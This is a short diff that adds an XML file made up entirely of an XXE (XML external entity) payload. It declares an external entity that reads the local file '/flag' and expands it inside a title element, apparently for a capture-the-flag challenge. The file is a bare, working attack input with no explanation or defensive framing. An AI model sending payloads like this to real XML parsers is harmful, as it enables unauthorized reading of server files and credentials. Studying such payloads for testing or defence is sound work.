@@ -1,0 +1,9 @@
+<!DOCTYPE foo [  
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "/flag" >]>
+<content>
+<title>&xxe;</title>
+<body>
+</body>
+</content>
+
